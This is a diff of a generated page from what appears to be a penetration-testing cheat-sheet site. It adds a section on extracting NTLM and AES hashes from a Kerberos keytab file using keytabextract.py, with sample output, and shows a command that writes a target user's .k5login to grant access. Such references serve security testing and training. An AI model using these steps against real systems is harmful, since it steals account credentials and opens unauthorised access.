@@ -156,6 +156,8 @@
   <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  <li><a href="https://tldrbins.github.io/@krb5/">Krb5</a></li>
+  <li><a href="https://tldrbins.github.io/@keytab/">Keytab</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -582,7 +584,7 @@ TO-DO</div></pre></div><h4 id="5-request-a-ticket">5. Request a Ticket</h4>
 
 <button data-tabset="set6" data-tabcontent="tab2">wmiexec</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set6"><div class="tabcontent active" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-config-etckrb5conf">1. Config /etc/krb5.conf</h4>
+</p><div class="tabset-wrapper" data-tabset-group="set6"><div class="tabcontent active" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-config-etckrb5conf">1. Config '/etc/krb5.conf'</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In UPPER <span class="k">case</span>
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[libdefaults]
@@ -650,7 +652,26 @@ TO-DO</div></pre></div><h4 id="5-request-a-ticket">5. Request a Ticket</h4>
 <h3 id="add-kerberos-access-in-linux">Add Kerberos Access in Linux</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">echo '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' &gt; /home/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>/.k5login
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div>
+TO-DO</div></pre></div><hr>
+<h3 id="extract-ntlm-from-keytab">Extract NTLM from Keytab</h3>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">cat /etc/ktb5.keytab | base64 -w0
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract
+</span></span><span class="line"><span class="cl"><span class="go">python3 keytabextract.py krb5.keytab 
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 keytabextract.py krb5.keytab
+</span></span><span class="line"><span class="cl"><span class="go">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Keytab File successfully imported.
+</span></span></span><span class="line"><span class="cl"><span class="go">        REALM : EXAMPLE.COM
+</span></span></span><span class="line"><span class="cl"><span class="go">        SERVICE PRINCIPAL : MAIL01$/
+</span></span></span><span class="line"><span class="cl"><span class="go">        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
+</span></span></span><span class="line"><span class="cl"><span class="go">        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
+</span></span></span><span class="line"><span class="cl"><span class="go">        AES-128 HASH : 3a732454c95bcef529167b6bea476458
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></em></small></p>
+
 </div>
 </main>
 <script type="module" src="/js/main.js"></script>
